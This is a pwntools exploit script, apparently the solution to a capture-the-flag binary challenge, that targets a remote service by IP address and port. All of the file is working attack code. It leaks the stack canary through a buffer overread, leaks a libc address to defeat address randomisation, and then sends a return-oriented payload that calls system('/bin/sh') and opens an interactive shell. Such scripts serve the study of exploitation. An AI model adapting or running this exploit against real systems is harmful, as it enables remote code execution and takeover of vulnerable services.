from pwn import *

context.binary = exe = ELF('./chall')
libc = ELF('./libc.so.6')

io = remote('45.153.243.57', 1337)
# io = process()
# gdb.attach(io, api=True)

io.recvuntil(b'???\n')
io.sendline(b'200')
io.recvuntil(b'content\n')
payload = b'i'*72
io.sendline(payload)
io.recvuntil(b'i\n')
canary = u64(io.recv(7).rjust(8, b'\x00'))
io.recvuntil(b'?\n')
io.sendline(b'1337')
log.info(f'Canary: {hex(canary)}')

io.recvuntil(b'???\n')
io.sendline(b'200')
io.recvuntil(b'content\n')
payload = b'i'*80 + b'a'*8
io.send(payload)
io.recvuntil(b'aaaaaaaa')
libc.address = u64(io.recvline(keepends=False).ljust(8, b'\x00')) - 0x29d90
io.recvuntil(b'?\n')
io.sendline(b'1337')
log.info(f'Libc base: {hex(libc.address)}')

pop_rdi = libc.address + 0x2a3e5
bin_sh = libc.address + 0x1d8698

io.recvuntil(b'???\n')
io.sendline(b'200')
io.recvuntil(b'content\n')
payload = b'i'*72 + p64(canary) + p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(pop_rdi+1) + p64(libc.sym['system'])
io.send(payload)
io.recvuntil(b'?\n')
io.sendline(b'69')

io.interactive()